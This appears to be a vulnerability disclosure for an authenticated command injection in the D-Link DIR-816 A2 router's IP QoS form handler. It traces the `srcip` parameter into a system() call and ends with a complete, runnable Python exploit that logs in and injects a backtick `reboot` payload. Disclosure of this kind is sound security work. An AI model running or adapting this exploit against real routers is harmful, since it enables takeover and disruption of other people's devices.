## DIR 816

> bin_vision:DIR-816A2_FWv1.10CNB05_R1B011D88210 / DIR-816A2_v1.10CNB03_D77137
> goahead / /bin/ip_qos
> goform/form2IPQoSTcAdd
>
> type: command injection
> string: srcip

### description

The `form2IPQoSTcAdd` handler receives the user-controlled `srcip` parameter from the GoAhead web request. The value is stored into NVRAM via `nvram_bufset()` without sanitization. The goahead binary then calls `doSystem("/bin/ip_qos")` to process the QoS rules. Inside `/bin/ip_qos`, the saved `srcip` value is read back from NVRAM, interpolated into an `iptables` command string via `snprintf()`, and passed to `system()` for execution.

Vulnerability chain: `websGetVar("srcip")` -> `nvram_bufset("IQoSRuleTable")` -> `doSystem("/bin/ip_qos")` -> `nvram_bufget("IQoSRuleTable")` -> `snprintf("iptables -t mangle -A ... -s %s/%d ...")` -> `system(cmd)`.

An authenticated attacker can inject shell metacharacters (e.g. backticks) in the `srcip` field to achieve command execution when the QoS rule is processed.

### code

#### form2IPQoSTcAdd handler (goahead)

~~~c
  websFormDefine("form2IPQoSTcAdd", (int)form2IPQoSTcAdd_handler);
~~~

~~~c
// form2IPQoSTcAdd handler - reads srcip and stores to NVRAM
char *srcip = websGetVar(wp, "srcip", "");     // <--- Read user-controlled srcip from the request
// ... no sanitization of srcip ...
nvram_bufset(0, "IQoSRuleTable", ...);          // <--- Store unescaped srcip in NVRAM
doSystem("/bin/ip_qos");                        // <--- Trigger QoS processing
~~~

#### ip_qos sink (/bin/ip_qos)

~~~c
// Inside /bin/ip_qos - reads rule from NVRAM and builds iptables command
char *srcip = nvram_bufget(0, "IQoSRuleTable"); // <--- Read tainted value from NVRAM
// Parses rule fields, srcip not sanitized
snprintf(cmd, size, "iptables -t mangle -A ... -s %s/%d ...", srcip, mask);  // <--- Insert srcip into iptables command
system(cmd);                                    // <--- Execute command with tainted value; command injection triggers here
~~~

### PoC

Source: `PoC/CNB05_FWv1.10/verified/poc_form2IPQoSTcAdd.py`

```python
"""
D-Link DIR-816 A2 - Command Injection in IP QoS Traffic Control (form2IPQoSTcAdd)
Firmware: DIR-816A2_FWv1.10CNB05_R1B011D88210 / DIR-816A2_v1.10CNB03_D77137
Entry: 000257 / 000349
Endpoint: /goform/form2IPQoSTcAdd
Parameter: srcip
Sink: /bin/ip_qos -> iptables -s %s/%d -> system()
"""

import requests
import base64
import time
import sys
import re

ROUTER_IP = "192.168.1.1"
USERNAME = "Admin"
PASSWORD = ""


def get_session():
    s = requests.Session()
    username_b64 = base64.b64encode(USERNAME.encode()).decode()
    password_b64 = base64.b64encode(PASSWORD.encode()).decode()
    login_data = {"username": username_b64, "password": password_b64}
    resp = s.post(f"http://{ROUTER_IP}/goform/formLogin", data=login_data, timeout=10)
    tokenid = ""
    match = re.search(r'tokenid"\s*value="(\d+)"', resp.text)
    if match:
        tokenid = match.group(1)
    return s, tokenid


def exploit():
    print(f"[*] Target: {ROUTER_IP}")
    print(f"[*] Vulnerability: Command Injection in IP QoS Traffic Control (form2IPQoSTcAdd)")
    print(f"[*] Endpoint: /goform/form2IPQoSTcAdd")
    print(f"[*] Parameter: srcip")
    print()
    print("[*] Logging in...")
    s, tokenid = get_session()
    if not tokenid:
        print("[-] Failed to get tokenid")
        sys.exit(1)
    print(f"[*] Got tokenid: {tokenid}")

    payload = "`reboot`"
    data = {"tokenid": tokenid, "proto": "tcp", "srcip": payload, "srcnetmask": "255.255.255.0", "dstip": "192.168.1.100", "dstnetmask": "255.255.255.0", "sport": "80", "dport": "80", "uprateFloor": "100", "uprateCeiling": "1000", "downrateFloor": "100", "downrateCeiling": "1000"}
    print(f"[*] Sending payload: {payload}")
    start = time.time()
    try:
        resp = s.post(f"http://{ROUTER_IP}/goform/form2IPQoSTcAdd", data=data, timeout=30)
    except requests.exceptions.Timeout:
        elapsed = time.time() - start
        print(f"[+] VULNERABLE! Request timed out after {elapsed:.2f}s")
        return
    except requests.exceptions.ConnectionError:
        elapsed = time.time() - start
        print(f"[+] VULNERABLE! Connection lost after {elapsed:.2f}s (device rebooted)")
        return
    elapsed = time.time() - start
    print(f"[*] Response time: {elapsed:.2f}s")

    # For reboot payload: device responds quickly then goes offline
    print("[*] Waiting 8s to check if device rebooted...")
    time.sleep(8)
    try:
        check = requests.get(f"http://{ROUTER_IP}/", timeout=5)
        print(f"[-] Device still online ({check.status_code}) — payload did not execute")
    except Exception:
        print("[+] VULNERABLE! Device went offline after payload (rebooted)")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        ROUTER_IP = sys.argv[1]
    exploit()
```
